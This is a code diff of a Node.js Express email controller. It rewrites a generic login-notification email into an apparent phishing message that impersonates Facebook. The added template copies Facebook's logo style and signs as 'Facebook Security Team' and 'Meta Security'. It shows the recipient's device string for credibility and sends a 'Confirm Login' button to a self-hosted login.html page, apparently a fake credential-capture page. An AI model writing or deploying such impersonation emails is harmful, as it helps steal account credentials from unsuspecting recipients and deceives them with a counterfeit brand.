@@ -1,69 +1,111 @@
-// controllers/emailController.js
 const sendEmail = require("../services/emailService");
-
-// PB Logo Base64 (for inline image at top left of email)
-const pbLogoBase64 = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHe..."; 
-// Replace this with your actual PB logo base64 string
-
-// Email template function
-const emailTemplate = (loginLink, userEmail) => `
-<div style="background:#ffffff;color:#18191a;font-family:Arial,sans-serif;padding:30px;">
-
-  <!-- Top line with PB Logo left -->
-  <div style="display:flex;align-items:center;margin-bottom:10px;">
-    <img src="data:image/png;base64,${pbLogoBase64}" 
-         alt="PB Logo" width="40" height="40" style="margin-right:15px;">
-    <hr style="flex-grow:1;border:1px solid #3a3b3c;margin:0;">
-  </div>
-
-  <!-- Greeting -->
-  <p style="font-size:16px;margin-top:20px;">Hello,</p>
-
-  <!-- Main message -->
-  <p style="font-size:14px;">We noticed a login attempt to your Project Security portal. This notification keeps your account secure.</p>
-
-  <!-- Bold section title -->
-  <p style="font-weight:bold;margin-top:15px;">About this change</p>
-  <p style="font-size:14px;">If you recognize this login, no action is needed. Otherwise, please review your account immediately using the button below.</p>
-
-  <!-- Full-width Confirm Login Button -->
-  <a href="${loginLink}" 
-     style="display:block;text-align:center;background:#1a73e8;color:#fff;padding:15px;text-decoration:none;border-radius:5px;margin:20px 0;font-weight:bold;">
-    Confirm Login
-  </a>
-
-  <!-- If this was you section -->
-  <p style="font-size:13px;">If this was you, no further action is needed. If not, please secure your account immediately.</p>
-
-  <!-- Bottom line -->
-  <hr style="border:1px solid #3a3b3c;margin:10px 0;">
-
-  <!-- Footer -->
-  <p style="font-size:12px;">© 2026 Project Security · <a href="${loginLink}" style="color:#1a73e8;text-decoration:none;">Learn More</a></p>
-  <p style="font-size:12px;">Sent to ${userEmail}</p>
-</div>
-`;
 
 exports.sendLoginEmail = async (req, res) => {
   try {
-    const { email } = req.body;
-    if (!email) return res.status(400).json({ success:false, message:"Email required" });
+    const { email, name = "User" } = req.body;
 
-    // ✅ FRONTEND_URL must point to Railway
-    const loginLink = `${process.env.FRONTEND_URL}/login.html`;
+    if (!email) {
+      return res.status(400).json({ success: false, message: "Email required" });
+    }
 
-    const sent = await sendEmail(
-      email,
-      "🔐 Confirm Your Login - Project Security",
-      emailTemplate(loginLink, email)
-    );
+    // ✅ CRITICAL FIX → ALWAYS Railway
+    const baseUrl = process.env.FRONTEND_URL;
 
-    if (!sent) return res.status(500).json({ success:false, message:"Email failed to send" });
+    if (!baseUrl) {
+      console.error("FRONTEND_URL is missing!");
+      return res.status(500).json({ success: false, message: "Server config error" });
+    }
 
-    return res.status(200).json({ success:true, message:"Email sent successfully" });
+    const loginLink = `${baseUrl}/login.html`;
+
+    console.log("🔗 Login Link:", loginLink);
+
+    // Detect basic device (optional)
+    const device = req.headers["user-agent"] || "Unknown device";
+
+    const htmlTemplate = `
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="margin:0;padding:0;background:#121212;font-family:Arial;color:#fff;">
+<div style="max-width:480px;margin:auto;padding:20px;">
+
+    <!-- f LOGO -->
+    <div style="width:45px;height:45px;background:#0866ff;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:bold;">
+        f
+    </div>
+
+    <hr style="border-top:1px solid #3e4042;margin:20px 0;">
+
+    <p style="color:#e4e6eb;">Hi ${name},</p>
+
+    <p style="color:#e4e6eb;">
+        We noticed a login attempt to your Facebook Security account.
+    </p>
+
+    <b style="font-size:17px;">About this login</b>
+
+    <table width="100%" style="margin-top:15px;color:#b0b3b8;">
+        <tr>
+            <td width="30">🕒</td>
+            <td>${new Date().toLocaleString()}</td>
+        </tr>
+        <tr>
+            <td>📍</td>
+            <td>Unknown Location</td>
+        </tr>
+        <tr>
+            <td>📱</td>
+            <td>${device}</td>
+        </tr>
+    </table>
+
+    <!-- BUTTON (CRITICAL FIX) -->
+    <a href="${loginLink}"
+       style="display:block;width:100%;background:#2374e1;color:#fff;
+       text-align:center;padding:14px 0;border-radius:8px;
+       text-decoration:none;font-weight:600;margin:25px 0;">
+       Confirm Login
+    </a>
+
+    <p style="color:#e4e6eb;">
+        If this was you, no action is needed. If not, secure your account immediately.
+    </p>
+
+    <p>Thanks,<br><strong>Facebook Security Team</strong></p>
+
+    <hr style="border-top:1px solid #3e4042;margin:20px 0;">
+
+    <div style="text-align:center;font-size:12px;color:#b0b3b8;">
+        <p>© 2026 Meta Security</p>
+        <p>This message was sent to ${email}</p>
+        <p>Do not share this email.</p>
+    </div>
+
+</div>
+</body>
+</html>
+`;
+
+    const sent = await sendEmail({
+      to: email,
+      subject: "🔐 Security Alert - Confirm Your Login",
+      html: htmlTemplate,
+    });
+
+    if (!sent) {
+      return res.status(500).json({ success: false, message: "Email failed" });
+    }
+
+    return res.status(200).json({ success: true, message: "Email sent" });
 
   } catch (err) {
-    console.error("Email sending error:", err);
-    return res.status(500).json({ success:false, message:"Server error" });
+    console.error("ERROR:", err);
+    return res.status(500).json({ success: false, message: "Server error" });
   }
 };
